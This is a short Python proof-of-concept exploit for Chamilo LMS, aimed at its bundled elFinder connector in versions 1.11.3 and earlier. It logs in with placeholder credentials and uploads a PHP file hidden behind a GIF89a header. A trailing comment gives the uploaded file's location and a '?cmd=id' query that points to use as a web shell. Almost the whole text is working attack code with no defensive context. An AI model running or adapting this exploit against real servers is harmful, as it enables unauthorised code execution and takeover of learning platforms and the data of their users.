# bypass upload restriction because of vulnerable elfinder
# vulnerable version:
# 1.11.3 and before
# 1.10 pre feb 2017

import requests

user = 'username'
pwd  = 'password'
host = 'https://1.11.2.chamilo.org'
path = '/'
s = requests.session()
res = s.post(host+path+'/index.php', data={"login": user, "password": pwd, "submitAuth": "", "_qf__formLogin": ""})

upload = s.post(host+path+"/main/inc/lib/elfinder/connectorAction.php?",
        headers={"Content-Type": "multipart/form-data; boundary=---------------------------1379839261282555674826869401"},
        data="-----------------------------1379839261282555674826869401\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------1379839261282555674826869401\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------1379839261282555674826869401\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"info.php\"\r\nContent-Type: text/php\r\n\r\nGIF89a?????????????????????!??????????????,?????????????????????D???;???<?php\r\nphpinfo();\n?>\n\r\n-----------------------------1379839261282555674826869401--\r\n")

print upload.text
# given that your id is 3, you'll find uploaded file at https://1.11.2.chamilo.org/app/upload/users/3/3/my_files/anyfolder/file.php?cmd=id;
